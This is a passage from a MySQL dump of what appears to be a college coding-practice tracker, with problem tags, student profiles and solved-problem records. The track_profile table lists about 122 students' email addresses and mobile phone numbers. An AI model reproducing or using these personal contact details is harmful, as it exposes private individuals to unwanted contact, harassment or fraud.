Table',2965),(8547,'Math',2965),(8548,'Matrix',2965),(8549,'Array',2966),(8550,'Greedy',2966),(8551,'Sorting',2966),(8552,'Array',2967),(8553,'Math',2967),(8554,'Greedy',2967),(8555,'Sorting',2967),(8556,'Array',2968),(8557,'Binary Search',2968),(8558,'Sliding Window',2968),(8559,'Sorting',2968),(8560,'Prefix Sum',2968);
/*!40000 ALTER TABLE `track_problemtags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_profile`
--

DROP TABLE IF EXISTS `track_profile`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_profile` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `mobile_no` varchar(10) NOT NULL,
  `batch_id` bigint NOT NULL,
  `department_id` bigint NOT NULL,
  `institute_id` bigint NOT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=123 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_profile`
--

LOCK TABLES `track_profile` WRITE;
/*!40000 ALTER TABLE `track_profile` DISABLE KEYS */;
INSERT INTO `track_profile` VALUES (1,'pnr.cse@karpagamtech.ac.in','9952294298',1,1,1,3),(2,'21ada64@karpagamtech.ac.in','8610721274',1,3,1,127),(3,'21ada61@karpagamtech.ac.in','9345706550',1,3,1,128),(4,'21csa60@karpagamtech.ac.in','9080306635',1,1,1,129),(5,'21csa36@karpagamtech.ac.in','9345803654',1,1,1,130),(6,'21csa27@karpagamtech.ac.in','9342440990',1,1,1,131),(7,'21csa12@karpagamtech.ac.in','8778244571',1,1,1,132),(8,'21csa42@karpagamtech.ac.in','9095811117',1,1,1,133),(9,'21csa19@karpagamtech.ac.in','8610356732',1,1,1,134),(10,'21csa28@karpagamtech.ac.in','8610301342',1,1,1,135),(11,'santhoshragaventhar@gmail.com','8807190740',1,1,1,136),(12,'sabarigirivasan05@gmail.com','8248214820',1,4,1,137),(13,'vishva28sep@gmail.com','9384975044',1,4,1,138),(14,'21ecb13@karpagamtech.ac.in','9344776097',1,4,1,139),(15,'21eca12@karpagamtech.ac.in','7339616476',1,4,1,140),(16,'21ecb29@karpagamtech.ac.in','9498845976',1,4,1,141),(17,'21eca17@karpagamtech.ac.in','8148031731',1,4,1,142),(18,'21eca01@karpagamtech.ac.in','6379193835',1,4,1,143),(19,'21ita57@karpagamtech.ac.in','7094388566',1,2,1,144),(20,'21ita30@karpagamtech.ac.in','7530077276',1,2,1,145),(21,'21ita47@karpagamtech.ac.in','8122338445',1,2,1,146),(22,'21ita17@karpagamtech.ac.in','8608406584',1,2,1,147),(23,'21mea20@karpagamtech.ac.in','6369086221',1,6,1,148),(24,'21mea45@karpagamtech.ac.in','9566591093',1,6,1,149),(25,'21ita44@karpagamtech.ac.in','9361936913',1,2,1,150),(26,'21ecb32@karpagamtech.ac.in','8754640274',1,4,1,151),(27,'21eea29@karpagamtech.ac.in','9342559603',1,5,1,156),(28,'sarveshwaramanjula@gmail.com','9500407692',1,2,1,157),(29,'21ita43@karpagamtech.ac.in','9344089249',1,2,1,158),(30,'21ecb18@karpagamtech.ac.in','7904608212',1,4,1,159),(31,'21ecb17@karpagamtech.ac.in','9629750188',1,4,1,160),(32,'21eca18@karpagamtech.ac.in','7010922869',1,4,1,161),(33,'21ecb58@karpagamtech.ac.in','6381343497',1,4,1,162),(34,'t21ada38@karpagamtech.ac.in','9385825482',1,3,1,163),(35,'21ita48@karpagamtech.ac.in','8870443263',1,2,1,164),(36,'22lita03@karpagamtech.ac.in','9360109883',1,2,1,165),(37,'21mea10@karpagamtech.ac.in','9629976377',1,6,1,166),(38,'21ada14@karpagamtech.ac.in','9342999822',1,3,1,167),(39,'21mea04@karpagamtech.ac.in','7550386661',1,6,1,168),(40,'21ita50@karpagamtech.ac.in','6380860476',1,2,1,169),(41,'ravismart183@gmail.com','8807142718',1,4,1,170),(42,'21cas01@karpagamtech.ac.in','9342069320',1,1,1,171),(43,'elangodhandapani8448@gmail.com','6380328708',1,6,1,172),(44,'21eca33@karpagamtech.ac.in','6374166063',1,4,1,173),(45,'21ecb23@karpagamtech.ac.in','8903564432',1,4,1,174),(46,'aravindamr23@gmail.com','8110999071',1,5,1,175),(47,'21ita42@karpagamtech.ac.in','6380426844',1,2,1,176),(48,'21ita16@karpagamtech.ac.in','8667214326',1,2,1,177),(49,'21eca22@karpagamtech.ac.in','9092049957',1,4,1,178),(50,'21eca37@karpagamtech.ac.in','9677841821',1,4,1,179),(51,'21ita46@karpagamtech.ac.in','7358981171',1,2,1,180),(52,'nivethaneswaran@gmail.com','9042744118',1,5,1,181),(53,'amithasrini149@gmail.com','7904575644',1,4,1,182),(54,'21ita39@karpagamtech.ac.in ','7806827883',1,2,1,183),(55,'rachikadiva@gmail.com','9362006465',1,4,1,184),(56,'parthibanparthiban621@gmail.com','9791459451',1,5,1,185),(57,'21ita53@karpagamtech.ac.in','6380449986',1,2,1,186),(58,'21ada20@karpagamtech.ac.in','8248008903',1,3,1,187),(59,'21csa56@karpagamtech.ac.in','9025243890',1,1,1,188),(60,'21ita37@karpagamtech.ac.in','9751069619',1,2,1,189),(61,'21ita28@karpagamtech.ac.in','9488156864',1,2,1,190),(62,'21csa40@karpagamtech.ac.in','9585024206',1,1,1,191),(63,'21ita26@karpagamtech.ac.in','7094935705',1,2,1,192),(64,'21ada27@karpagamtech.ac.in','8778224452',1,3,1,193),(65,'sanjaysivakumar2261@gmail.com','9361403056',1,4,1,194),(66,'21csa48@karpagamtech.ac.in','8870603710',1,1,1,195),(67,'21eca51@karpagamtech.ac.in','9360375610',1,4,1,196),(68,'21ecb06@karpagamtech.ac.in','8317497305',1,4,1,197),(69,'21ita34@karpagamtech.ac.in','6381388191',1,2,1,198),(70,'21eca19@karpagamtech.ac.in','8110978316',1,4,1,199),(71,'21csa16@karpagamtech.ac.in','9677351759',1,1,1,200),(72,'vijaykanthan03@gmail.com','9952103324',1,5,1,201),(73,'21ita32@karpagamtech.ac.in','8807701809',1,2,1,202),(74,'21eca08@karpagamtech.ac.in','9364650517',1,4,1,203),(75,'jishasree2002@gmail.com','9600487445',1,4,1,204),(76,'vigneshvignesh84569@gmail.com','8072702322',1,4,1,205),(77,'21ita10@karpagamtech.ac.in','7502950258',1,2,1,206),(78,'21ada52@karpagamtech.ac.in','9361052128',1,3,1,207),(79,'21ita23@karpagamtech.ac.in','6380631556',1,2,1,208),(80,'21eca26@karpagamtech.ac.in','9677962767',1,4,1,209),(81,'vimal540ngmail.com','9345468929',1,4,1,210),(82,'21eca56@karpagamtech.ac.in','9487307707',1,4,1,211),(83,'21eca15@karpagamtech.ac.in','8072282232',1,4,1,212),(84,'aramananashokkumar@gmail.com','9943755207',1,5,1,213),(85,'deepikamadhesh23@gmail.com','9345694772',1,3,1,214),(86,'21ita55@karpagamtech.ac.in','9345275635',1,2,1,215),(87,'21eca34@karpagamtech.ac.in','9342997367',1,4,1,216),(88,'21ita63@karpagamtech.ac.in','9791968671',1,2,1,217),(89,'21ita33@karpagamtech.ac.in','6382751210',1,2,1,218),(90,'21eca16@karpagamtech.ac.in','8838756578',1,4,1,219),(91,'21ada02@karpagamtech.ac.in','8438053616',1,3,1,220),(92,'21eca41@karpagamtech.ac.in','8870371175',1,4,1,221),(93,'21csa11@karpagamtech.ac.in','9344021188',1,1,1,222),(94,'praveensubramani2004@gmail.com','6381202637',1,4,1,223),(95,'21ada59@karpagamtech.ac.in','7092984349',1,3,1,224),(96,'21ada56@karpagamtech.ac.in','6383936360',1,3,1,225),(97,'21ita40@karpagamtech.ac.in','9655593989',1,2,1,226),(98,'21eca57@karpagamtech.ac.in','8946007088',1,4,1,227),(99,'21ita59@karpagamtech.ac.in','8220130171',1,2,1,228),(100,'kasimani272004@gmail.com','8438575423',1,4,1,229),(101,'21ita60@karpagamtech.ac.in','6381649541',1,2,1,230),(102,'21ada29@karpagamtech.ac.in','9566702089',1,3,1,231),(103,'21csa35@karpagamtech.ac.in','6374677300',1,1,1,232),(104,'21csa25@karpagamtech.ac.in','9597145944',1,1,1,233),(105,'mohanajagan7603@gmail.com','9047493676',1,5,1,234),(106,'21eea02@karpagamtech.ac.in','7806902100',1,5,1,235),(107,'afreenhaji29@gmail.com','9342063367',1,5,1,236),(108,'21csa57@karpagamtech.ac.in','9150223019',1,1,1,237),(109,'21ada57@karpagamtech.ac.in','7448400969',1,3,1,238),(110,'21ada07@karpagamtech.ac.in','9080522077',1,3,1,239),(111,'21csa46@karpagamtech.ac.in','7550368038',1,1,1,240),(112,'21ada60@karpagamtech.ac.in','9342201828',1,3,1,241),(113,'21csa49@karpagamtech.ac.in','7695858243',1,1,1,242),(114,'21eca54@karpagamtech.ac.in','7695994029',1,4,1,243),(115,'21ita29@karpagamtech.ac.in','7904474349',1,2,1,244),(116,'21csa41@karpagamtech.ac.in','9342402442',1,1,1,245),(117,'t21ada32@karpagamtech.ac.in','9159580968',1,3,1,246),(118,'21ada17@karpagamtech.ac.in','9360311963',1,3,1,247),(119,'21csa39@karpagamtech.ac.in','7448465382',1,1,1,248),(120,'21csa15@karpagamtech.ac.in','6369099225',1,1,1,154),(121,'21ita27@karpagamtech.ac.in','9344795878',1,2,1,249),(122,'21csa23@karpagamtech.ac.in','9678952859',1,1,1,250);
/*!40000 ALTER TABLE `track_profile` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_solved_problem`
--

DROP TABLE IF EXISTS `track_solved_problem`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_solved_problem` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `problem_id` bigint NOT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12688 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_solved_problem`
--

LOCK TABLES `track_solved_problem` WRITE;
/*!40000 ALTER TABLE `track_solved_problem` DISABLE KEYS */;
INSERT INTO `track_solved_problem` VALUES (1,441,3),(2,374,3),(3,41,3),(4,2806,139),(5,2798,139),(6,2586,139),(7,2500,139),(8,2186,139),(9,2114,139),(10,1929,139),(11,1898,139),(12,2894,133),(13,2806,133),(14,2807,133),(15,2810,133),(16,1572,139),(17,2798,133),(18,1461,139),(19,2586,133),(20,1343,139),(21,1254,139),(22,2894,141),(23,2181,133),(24,981,139),(25,2130,133),(26,977,139),(27,2114,133),(28,2095,133),(29,929,139),(30,896,139),(31,876,139),(32,875,139),(33,867,139),(34,1984,133),(35,832,139),(36,1929,133),(37,704,139),(38,1898,133),(39,746,139),(40,724,139),(41,680,139),(42,665,139),(43,560,139),(44,1732,133),(45,2114,141),(46,1662,133),(47,463,139),(48,441,139),(49,438,139),(50,412,139),(51,1984,141),(52,380,139),(53,1572,133),(54,374,139),(55,371,139),(56,1968,141),(57,367,139),(58,1512,133),(59,1929,141),(60,347,139),(61,344,139),(62,338,139),(63,283,139),(64,271,139),(65,2269,133),(66,1282,133),(67,1268,133),(68,1768,141),(69,242,139),(70,238,139),(71,237,139),(72,231,139),(73,217,139),(74,206,139),(75,205,139),(76,191,139),(77,190,139),(78,189,139),(79,187,139),(80,169,139),(81,167,139),(82,153,139),(83,142,139),(84,141,139),(85,136,139),(86,1646,141),(87,128,139),(88,125,139),(89,122,139),(90,88,139),(91,1572,141),(92,75,139),(93,74,139),(94,70,139),(95,54,139),(96,49,139),(97,42,139),(98,41,139),(99,35,139),(100,34,139),(101,33,139),(102,28,139),(103,27,139),(104,26,139),(105,20,139),(106,16,139),(107,14,139),(108,11,139),(109,9,139),(110,4,139),(111,3,139),(112,1,139),(113,1004,133),(114,1380,141),(115,1343,141),(116,977,133),(117,509,133),(118,1268,141),(119,881,133),(120,876,133),(121,875,133),(122,1137,141),(123,706,133),(124,1287,141),(125,704,133),(126,724,133),(127,680,133),(128,643,133),(129,981,141),(130,977,141),(131,929,141),(132,487,133),(133,485,133),(134,441,133),(135,438,133),(136,881,141),(137,876,141),(138,875,141),(139,412,133),(140,867,141),(141,410,133),(142,374,133),(143,367,133),(144,832,141),(145,347,133),(146,344,133),(147,338,133),(148,704,141),(149,283,133),(150,746,141),(151,242,133),(152,238,133),(153,237,133),(154,231,133),(155,724,141),(156,219,133),(157,217,133),(158,209,133),(159,206,133),(160,203,133),(161,191,133),(162,190,133),(163,189,133),(164,179,133),(165,169,133),(166,167,133),(167,160,133),(168,159,133),(169,153,133),(170,151,133),(171,136,133),(172,567,141),(173,125,133),(174,560,141),(175,121,133),(176,118,133),(177,104,133),(178,94,133),(179,92,133),(180,88,133),(181,75,133),(182,74,133),(183,70,133),(184,69,133),(185,59,133),(186,58,133),(187,54,133),(188,53,133),(189,49,133),(190,42,133),(191,41,133),(192,463,141),(193,35,133),(194,34,133),(195,33,133),(196,28,133),(197,27,133),(198,26,133),(199,23,133),(200,21,133),(201,441,141),(202,20,133),(203,19,133),(204,15,133),(205,14,133),(206,13,133),(207,11,133),(208,9,133),(209,412,141),(210,5,133),(211,4,133),(212,410,141),(213,3,133),(214,2,133),(215,1,133),(216,392,141),(217,374,141),(218,367,141),(219,347,141),(220,344,141),(221,322,141),(222,283,141),(223,279,141),(224,258,141),(225,242,141),(226,238,141),(227,237,141),(228,217,141),(229,206,141),(230,205,141),(231,198,141),(232,191,141),(233,190,141),(234,189,141),(235,186,141),(236,179,141),(237,169,141),(238,167,141),(239,153,141),(240,136,141),(241,128,141),(242,125,141),(243,122,141),(244,121,141),(245,119,141),(246,118,141),(247,88,141),(248,83,141),(249,75,141),(250,74,141),(251,70,141),(252,69,141),(253,66,141),(254,55,141),(255,53,141),(256,48,141),(257,42,141),(258,41,141),(259,35,141),(260,34,141),(261,33,141),(262,27,141),(263,26,141),(264,21,141),(265,18,141),(266,14,141),(267,11,141),(268,9,141),(269,7,141),(270,5,141),(271,4,141),(272,1,141),(273,2894,137),(274,2810,137),(275,2798,137),(276,2733,137),(277,2614,137),(278,2586,137),(279,2578,137),(280,2540,137),(281,2529,137),(282,2500,137),(283,2469,137),(284,2433,137),(285,2235,137),(286,2181,137),(287,2114,137),(288,2089,137),(289,1984,137),(290,1929,137),(291,1898,137),(292,2894,148),(293,2848,148),(294,1800,137),(295,2824,148),(296,1768,137),(297,2697,148),(298,1646,137),(299,1572,137),(300,1512,137),(301,2441,148),(302,1351,137),(303,1346,137),(304,1343,137),(305,1268,137),(306,2117,148),(307,2114,148),(308,1176,137),(309,1137,137),(310,1984,148),(311,1929,148),(312,1025,137),(313,1085,137),(314,1876,148),(315,981,137),(316,977,137),(317,976,137),(318,509,137),(319,929,137),(320,1768,148),(321,881,137),(322,877,137),(323,876,137),(324,875,137),(325,867,137),(326,832,137),(327,1572,148),(328,704,137),(329,766,137),(330,1480,148),(331,1461,148),(332,746,137),(333,744,137),(334,724,137),(335,1351,148),(336,680,137),(337,1343,148),(338,2269,148),(339,643,137),(340,2894,140),(341,594,137),(342,560,137),(343,557,137),(344,507,137),(345,498,137),(346,463,137),(347,441,137),(348,438,137),(349,412,137),(350,410,137),(351,392,137),(352,374,137),(353,371,137),(354,367,137),(355,2586,140),(356,347,137),(357,345,137),(358,344,137),(359,338,137),(360,322,137),(361,315,137),(362,287,137),(363,283,137),(364,279,137),(365,278,137),(366,271,137),(367,268,137),(368,977,148),(369,242,137),(370,238,137),(371,237,137),(372,234,137),(373,2390,140),(374,219,137),(375,217,137),(376,912,148),(377,209,137),(378,206,137),(379,205,137),(380,203,137),(381,198,137),(382,191,137),(383,190,137),(384,876,148),(385,189,137),(386,875,148),(387,179,137),(388,867,148),(389,169,137),(390,167,137),(391,162,137),(392,153,137),(393,152,137),(394,151,137),(395,136,137),(396,128,137),(397,125,137),(398,122,137),(399,121,137),(400,119,137),(401,118,137),(402,88,137),(403,75,137),(404,704,148),(405,74,137),(406,70,137),(407,69,137),(408,2114,140),(409,58,137),(410,54,137),(411,53,137),(412,49,137),(413,744,148),(414,42,137),(415,41,137),(416,1984,140),(417,35,137),(418,34,137),(419,33,137),(420,28,137),(421,1929,140),(422,27,137),(423,26,137),(424,19,137),(425,18,137),(426,15,137),(427,1876,140),(428,14,137),(429,11,137),(430,9,137),(431,7,137),(432,4,137),(433,3,137),(434,1,137),(435,557,148),(436,1672,140),(437,463,148),(438,441,148),(439,438,148),(440,1572,140),(441,412,148),(442,410,148),(443,1502,140),(444,374,148),(445,1498,140),(446,367,148),(447,1480,140),(448,349,148),(449,347,148),(450,344,148),(451,1461,140),(452,283,148),(453,278,148),(454,268,148),(455,1343,140),(456,1342,140),(457,258,148),(458,2269,140),(459,242,148),(460,240,148),(461,238,148),(462,237,148),(463,217,148),(464,215,148),(465,209,148),(466,206,148),(467,203,148),(468,202,148),(469,191,148),(470,190,148),(471,172,148),(472,169,148),(473,167,148),(474,162,148),(475,154,148),(476,153,148),(477,143,148),(478,136,148),(479,125,148),(480,122,148),(481,81,148),(482,75,148),(483,74,148),(484,69,148),(485,66,148),(486,58,148),(487,50,148),(488,49,148),(489,41,148),(490,35,148),(491,34,148),(492,33,148),(493,989,140),(494,29,148),(495,28,148),(496,27,148),(497,26,148),(498,977,140),(499,21,148),(500,20,148),(501,19,148),(502,929,140),(503,11,148),(504,9,148),(505,7,148),(506,4,148),(507,3,148),(508,2,148),(509,1,148),(510,881,140),(511,876,140),(512,875,140),(513,867,140),(514,832,140),(515,704,140),(516,724,140),(517,680,140),(518,665,140),(519,560,140),(520,463,140),(521,441,140),(522,412,140),(523,380,140),(524,374,140),(525,367,140),(526,347,140),(527,344,140),(528,338,140),(529,283,140),(530,271,140),(531,268,140),(532,242,140),(533,237,140),(534,234,140),(535,217,140),(536,215,140),(537,209,140),(538,206,140),(539,191,140),(540,189,140),(541,2960,150),(542,187,140),(543,179,140),(544,2946,150),(545,169,140),(546,167,140),(547,164,140),(548,2923,150),(549,2917,150),(550,153,140),(551,2894,150),(552,141,140),(553,2895,150),(554,136,140),(555,125,140),(556,122,140),(557,118,140),(558,88,140),(559,81,140),(560,75,140),(561,74,140),(562,70,140),(563,62,140),(564,58,140),(565,42,140),(566,41,140),(567,35,140),(568,34,140),(569,33,140),(570,27,140),(571,26,140),(572,2769,150),(573,15,140),(574,9,140),(575,1,140),(576,2652,150),(577,2500,150),(578,2469,150),(579,2413,150),(580,2367,150),(581,2235,150),(582,2181,150),(583,2160,150),(584,2125,150),(585,2114,150),(586,2016,150),(587,2011,150),(588,1984,150),(589,1929,150),(590,1816,150),(591,1763,150),(592,1672,150),(593,1662,150),(594,1572,150),(595,1512,150),(596,1523,150),(597,1491,150),(598,1351,150),(599,1342,150),(600,2269,150),(601,1281,150),(602,1137,150),(603,1299,150),(604,1131,150),(605,977,150),(606,876,150),(607,875,150),(608,867,150),(609,832,150),(610,704,150),(611,746,150),(612,709,150),(613,557,150),(614,481,150),(615,463,150),(616,441,150),(617,412,150),(618,410,150),(619,387,150),(620,374,150),(621,371,150),(622,367,150),(623,347,150),(624,338,150),(625,283,150),(626,268,150),(627,242,150),(628,237,150),(629,234,150),(630,229,150),(631,217,150),(632,209,150),(633,206,150),(634,203,150),(635,202,150),(636,198,150),(637,191,150),(638,190,150),(639,189,150),(640,179,150),(641,169,150),(642,167,150),(643,164,150),(644,160,150),(645,141,150),(646,136,150),(647,125,150),(648,122,150),(649,121,150),(650,74,150),(651,70,150),(652,69,150),(653,67,150),(654,66,150),(655,54,150),(656,53,150),(657,50,150),(658,43,150),(659,42,150),(660,35,150),(661,34,150),(662,33,150),(663,28,150),(664,27,150),(665,21,150),(666,19,150),(667,15,150),(668,14,150),(669,11,150),(670,9,150),(671,7,150),(672,3,150),(673,1,150),(674,2894,138),(675,2798,138),(676,2707,138),(677,2570,138),(678,2500,138),(679,2114,138),(680,1984,138),(681,1929,138),(682,1898,138),(683,1572,138),(684,1343,138),(685,1268,138),(686,1137,138),(687,981,138),(688,977,138),(689,881,138),(690,876,138),(691,875,138),(692,867,138),(693,832,138),(694,704,138),(695,746,138),(696,724,138),(697,680,138),(698,665,138),(699,647,138),(700,560,138),(701,498,138),(702,463,138),(703,2917,144),(704,441,138),(705,2894,144),(706,2895,144),(707,415,138),(708,412,138),(709,410,138),(710,374,138),(711,367,138),(712,2824,144),(713,347,138),(714,344,138),(715,338,138),(716,322,138),(717,283,138),(718,279,138),(719,2652,144),(720,271,138),(721,268,138),(722,258,138),(723,242,138),(724,240,138),(725,238,138),(726,237,138),(727,234,138),(728,217,138),(729,213,138),(730,206,138),(731,2578,144),(732,198,138),(733,191,138),(734,190,138),(735,189,138),(736,179,138),(737,169,138),(738,167,138),(739,160,138),(740,155,138),(741,153,138),(742,152,138),(743,151,138),(744,2500,144),(745,142,138),(746,141,138),(747,139,138),(748,136,138),(749,128,138),(750,125,138),(751,122,138),(752,2469,144),(753,121,138),(754,118,138),(755,111,138),(756,88,138),(757,86,138),(758,2418,144),(759,75,138),(760,74,138),(761,71,138),(762,70,138),(763,69,138),(764,66,138),(765,61,138),(766,54,138),(767,49,138),(768,48,138),(769,42,138),(770,41,138),(771,2367,144),(772,35,138),(773,34,138),(774,33,138),(775,28,138),(776,27,138),(777,26,138),(778,19,138),(779,16,138),(780,15,138),(781,14,138),(782,11,138),(783,9,138),(784,2235,144),(785,7,138),(786,5,138),(787,4,138),(788,3,138),(789,1,138),(790,2181,144),(791,2160,144),(792,2114,144),(793,1984,144),(794,1929,144),(795,1876,144),(796,1859,144),(797,1748,144),(798,1672,144),(799,1662,144),(800,1572,144),(801,1552,144),(802,1512,144),(803,1470,144),(804,1464,144),(805,1343,144),(806,1342,144),(807,1281,144),(808,1137,144),(809,1051,144),(810,1025,144),(811,977,144),(812,509,144),(813,922,144),(814,877,144),(815,876,144),(816,875,144),(817,867,144),(818,832,144),(819,705,144),(820,704,144),(821,746,144),(822,709,144),(823,680,144),(824,557,144),(825,498,144),(826,463,144),(827,412,144),(828,410,144),(829,374,144),(830,367,144),(831,347,144),(832,322,144),(833,283,144),(834,242,144),(835,239,144),(836,237,144),(837,231,144),(838,217,144),(839,209,144),(840,206,144),(841,205,144),(842,198,144),(843,191,144),(844,189,144),(845,169,144),(846,167,144),(847,160,144),(848,153,144),(849,136,144),(850,125,144),(851,121,144),(852,118,144),(853,88,144),(854,74,144),(855,70,144),(856,66,144),(857,58,144),(858,54,144),(859,53,144),(860,52,144),(861,48,144),(862,42,144),(863,35,144),(864,34,144),(865,33,144),(866,28,144),(867,27,144),(868,26,144),(869,11,144),(870,9,144),(871,3,144),(872,1,144),(873,2917,130),(874,2894,130),(875,2833,130),(876,2825,130),(877,2828,130),(878,2806,130),(879,2824,130),(880,2807,130),(881,2815,130),(882,2784,130),(883,2785,130),(884,2810,130),(885,2798,130),(886,2816,130),(887,2799,130),(888,2829,130),(889,2586,130),(890,2500,130),(891,2300,130),(892,2235,130),(893,2181,130),(894,2114,130),(895,2024,130),(896,1984,130),(897,1968,130),(898,1929,130),(899,1898,130),(900,1870,130),(901,1876,130),(902,1572,130),(903,1512,130),(904,1474,130),(905,1493,130),(906,1343,130),(907,2269,130),(908,2574,132),(909,1268,130),(910,1232,130),(911,2500,132),(912,1089,130),(913,1180,130),(914,1133,130),(915,2181,132),(916,1134,130),(917,1100,130),(918,2130,132),(919,2114,132),(920,1005,130),(921,1004,130),(922,981,130),(923,977,130),(924,1984,132),(925,509,130),(926,929,130),(927,917,130),(928,1929,132),(929,881,130),(930,876,130),(931,875,130),(932,867,130),(933,832,130),(934,708,130),(935,704,130),(936,724,130),(937,713,130),(938,680,130),(939,1572,132),(940,665,130),(941,643,130),(942,560,130),(943,541,130),(944,1721,130),(945,487,130),(946,485,130),(947,481,130),(948,1343,132),(949,445,130),(950,443,130),(951,442,130),(952,441,130),(953,412,130),(954,410,130),(955,374,130),(956,367,130),(957,350,130),(958,349,130),(959,347,130),(960,344,130),(961,340,130),(962,338,130),(963,326,130),(964,283,130),(965,1137,132),(966,278,130),(967,268,130),(968,258,130),(969,245,130),(970,243,130),(971,242,130),(972,240,130),(973,238,130),(974,237,130),(975,234,130),(976,219,130),(977,217,130),(978,1005,132),(979,1004,132),(980,209,130),(981,977,132),(982,509,132),(983,206,130),(984,205,130),(985,203,130),(986,191,130),(987,190,130),(988,189,130),(989,179,130),(990,169,130),(991,167,130),(992,162,130),(993,160,130),(994,159,130),(995,153,130),(996,929,132),(997,141,130),(998,136,130),(999,125,130),(1000,881,132),(1001,122,130),(1002,876,132),(1003,875,132),(1004,121,130),(1005,867,132),(1006,118,130),(1007,832,132),(1008,92,130),(1009,88,130),(1010,83,130),(1011,81,130),(1012,77,130),(1013,704,132),(1014,75,130),(1015,74,130),(1016,69,130),(1017,746,132),(1018,67,130),(1019,66,130),(1020,58,130),(1021,53,130),(1022,50,130),(1023,46,130),(1024,41,130),(1025,39,130),(1026,35,130),(1027,34,130),(1028,33,130),(1029,28,130),(1030,27,130),(1031,26,130),(1032,647,132),(1033,23,130),(1034,643,132),(1035,21,130),(1036,20,130),(1037,19,130),(1038,15,130),(1039,14,130),(1040,13,130),(1041,12,130),(1042,11,130),(1043,9,130),(1044,7,130),(1045,4,130),(1046,3,130),(1047,2,130),(1048,1,130),(1049,487,132),(1050,485,132),(1051,463,132),(1052,441,132),(1053,412,132),(1054,410,132),(1055,392,132),(1056,374,132),(1057,367,132),(1058,350,132),(1059,349,132),(1060,347,132),(1061,344,132),(1062,338,132),(1063,283,132),(1064,278,132),(1065,268,132),(1066,243,132),(1067,242,132),(1068,238,132),(1069,237,132),(1070,234,132),(1071,217,132),(1072,209,132),(1073,206,132),(1074,205,132),(1075,203,132),(1076,198,132),(1077,191,132),(1078,190,132),(1079,189,132),(1080,186,132),(1081,179,132),(1082,169,132),(1083,167,132),(1084,162,132),(1085,160,132),(1086,153,132),(1087,152,132),(1088,151,132),(1089,141,132),(1090,136,132),(1091,125,132),(1092,121,132),(1093,94,132),(1094,88,132),(1095,83,132),(1096,80,132),(1097,75,132),(1098,74,132),(1099,73,132),(1100,70,132),(1101,69,132),(1102,66,132),(1103,61,132),(1104,59,132),(1105,58,132),(1106,54,132),(1107,53,132),(1108,48,132),(1109,42,132),(1110,41,132),(1111,35,132),(1112,34,132),(1113,33,132),(1114,28,132),(1115,27,132),(1116,26,132),(1117,21,132),(1118,20,132),(1119,19,132),(1120,15,132),(1121,14,132),(1122,11,132),(1123,9,132),(1124,7,132),(1125,6,132),(1126,4,132),(1127,3,132),(1128,2,132),(1129,1,132),(1130,2785,128),(1131,2586,128),(1132,2500,128),(1133,2181,128),(1134,2114,128),(1135,1984,128),(1136,1929,128),(1137,2966,149),(1138,2961,149),(1139,2957,149),(1140,2965,149),(1141,2951,149),(1142,2946,149),(1143,1572,128),(1144,2956,149),(1145,2942,149),(1146,2932,149),(1147,2923,149),(1148,2917,149),(1149,2908,149),(1150,2894,149),(1151,2903,149),(1152,2873,149),(1153,2895,149),(1154,2859,149),(1155,1460,128),(1156,2855,149),(1157,2848,149),(1158,2833,149),(1159,2828,149),(1160,2806,149),(1161,2807,149),(1162,2785,149),(1163,2810,149),(1164,2798,149),(1165,1343,128),(1166,2769,149),(1167,2829,149),(1168,1268,128),(1169,2706,149),(1170,2652,149),(1171,2610,149),(1172,2553,149),(1173,2535,149),(1174,1137,128),(1175,2520,149),(1176,2482,149),(1177,2500,149),(1178,2487,149),(1179,2469,149),(1180,1196,128),(1181,2460,149),(1182,1051,128),(1183,2418,149),(1184,2413,149),(1185,2396,149),(1186,2894,145),(1187,977,128),(1188,2351,149),(1189,2326,149),(1190,2235,149),(1191,2264,149),(1192,881,128),(1193,2221,149),(1194,876,128),(1195,2778,145),(1196,875,128),(1197,867,128),(1198,2181,149),(1199,832,128),(1200,2161,149),(1201,2125,149),(1202,2114,149),(1203,704,128),(1204,2095,149),(1205,2089,149),(1206,2586,145),(1207,2078,149),(1208,746,128),(1209,2500,145),(1210,2038,149),(1211,724,128),(1212,2016,149),(1213,2469,145),(1214,2011,149),(1215,2022,149),(1216,1984,149),(1217,680,128),(1218,1929,149),(1219,1913,149),(1220,1903,149),(1221,1874,149),(1222,1898,149),(1223,1897,149),(1224,1836,149),(1225,2235,145),(1226,1832,149),(1227,498,128),(1228,1845,149),(1229,1823,149),(1230,463,128),(1231,1800,149),(1232,1812,149),(1233,441,128),(1234,2181,145),(1235,1768,149),(1236,412,128),(1237,410,128),(1238,1758,149),(1239,2119,145),(1240,2114,145),(1241,374,128),(1242,1716,149),(1243,367,128),(1244,1688,149),(1245,350,128),(1246,347,128),(1247,344,128),(1248,1672,149),(1249,1662,149),(1250,1984,145),(1251,1624,149),(1252,1637,149),(1253,283,128),(1254,279,128),(1255,278,128),(1256,1929,145),(1257,271,128),(1258,1582,149),(1259,1578,149),(1260,260,128),(1261,1572,149),(1262,242,128),(1263,1535,149),(1264,238,128),(1265,237,128),(1266,234,128),(1267,1512,149),(1268,1523,149),(1269,217,128),(1270,1496,149),(1271,1474,149),(1272,206,128),(1273,203,128),(1274,1486,149),(1275,198,128),(1276,191,128),(1277,1480,149),(1278,190,128),(1279,1492,149),(1280,189,128),(1281,1491,149),(1282,179,128),(1283,1470,149),(1284,169,128),(1285,1464,149),(1286,167,128),(1287,1456,149),(1288,1461,149),(1289,153,128),(1290,1758,145),(1291,1436,149),(1292,1447,149),(1293,143,128),(1294,142,128),(1295,141,128),(1296,1424,149),(1297,137,128),(1298,136,128),(1299,1422,149),(1300,125,128),(1301,1431,149),(1